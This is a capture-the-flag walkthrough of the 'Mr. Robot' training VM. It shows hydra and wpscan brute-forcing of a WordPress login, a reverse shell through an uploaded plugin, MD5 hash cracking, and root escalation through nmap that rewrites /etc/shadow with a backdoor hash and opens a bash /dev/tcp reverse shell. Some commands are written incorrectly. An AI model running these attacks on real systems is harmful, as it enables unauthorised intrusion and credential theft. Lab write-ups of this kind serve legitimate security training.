# Mr. Robot
_IP: 10.0.4.5_

The first thing I did was an nmap scan which you can find i this folder.
Basicly, it did not tell us much, but I found out that there is site running.

_The first thing I checked was:_
https://10.0.4.5/robots.txt

_This is what I've got:_<br>
User-agent: *<br>
fsocity.dic<br>
key-1-of-3.txt

> [!NOTE]
> _key-1-of-3.txt is a flag for ctf doers._

Let's try to hack the hash:
john --wordlist=fsocity.dic --format=raw-md4 hash.txt
There is no answer for this hash in fsocity.dic.

log=user&pwd=pwd&wp-submit=Log+In&redirect_to=http%3A%2F%2F10.0.4.5%2Fwp-admin%2F&testcookie=1

curl -v --data 'log=user&pwd=pwd&wp-submit=Log+In&redirect_to=http%3A%2F%2F10.0.4.5%2Fwp-admin%2F&testcookie=1' --cookie 'wordpress_test_cookie=WP+Cookie+check' http://10.0.4.5/wp-login.php

hydra -L fsocity.dic -p admin 10.0.4.5 http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In&redirect_to=http%3A%2F%2F10.0.4.5%2Fwp-admin%2F&testcookie=1:Invalid username" -V

[80][http-post-form] host: 10.0.4.5   login: Elliot   password: admin
found the right username. Now I am gonna look for a password

hydra -l Elliot -P fsocity.dic 10.0.4.5 http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In&redirect_to=http%3A%2F%2F10.0.4.5%2Fwp-admin%2F&testcookie=1:The password you entered" -V

Looks like it does not work.

But we know that there is a user named elliot.

WordPress version 4.3.32

hydra -t64 -L fsocity.dic -p test 10.0.4.5 http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In&redirect_to=http%3A%2F%2F10.0.4.5%2Fwp-admin%2F&testcookie=1:Invalid" -V

wpscan --url 10.0.4.5 --usernames Elliot --passwords fsocity.dic --password-attack wp-login

Do not forget to remove repeats
sort fsocity.dic | uniq > fsocity.dic 

To find how many lines left:
wc -l

Now we can do brute force again and hopefully we will find a password for the wordpress admin page
Username: Elliot
Password: ER28-0652

zip rev-plug.zip ./shell.php

upload the plugin, set up a nc listener, and activate the plugin. Now we have a reverse-shell.

We can see that there is a user named robot. Go to his folder and we will find:
key-2-of-3.txt
password.raw-md5

We do not have permission to read key-2-of-3.txt, but reading password.raw-md5 we will see:
robot:c3fcd3d76192e4007dfb496cca67e13b
Let's crack the hash.
john --format=raw-md5 --wordlist=/usr/share/wordlists/rockyou.txt robot_hash.txt
username: robot
password: abcdefghijklmnopqrstuvwxyz

use this command to upgrade the shell:
python -c 'import pty; pty.spawn("/bin/bash")'

Log in as robot.

And now we've got the second key.

we cannot run sudo. Let's look what we can do.

nmap -iL /etc/shadow

root:$6$9xQC1KOf$5cmONytt0VF/wi3Np3jZGRSVzpGj6sXxVHkyJLjV4edlBxTVmW91pcGwAViViSWcAS/.OF0iuvylU5IznY2Re.:16753:0:99999:7:::

WVLY0mgH0RtUI = mrcake

nmap --interactive
!sh

Then modify the password of root in /etc/shadow so that you can easily access it again.

root:WVLY0mgH0RtUI:16753:0:99999:7:::

LFILE=/etc/shadow
nmap -oG=$LFILE "root:WVLY0mgH0RtUI:16753:0:99999:7:::"

TF=$(sh)
echo 'os.execute("/bin/sh")' > $TF
./nmap --script=$TF

bash -i >& /dev/tcp/10.0.4.4/4444 0>&1
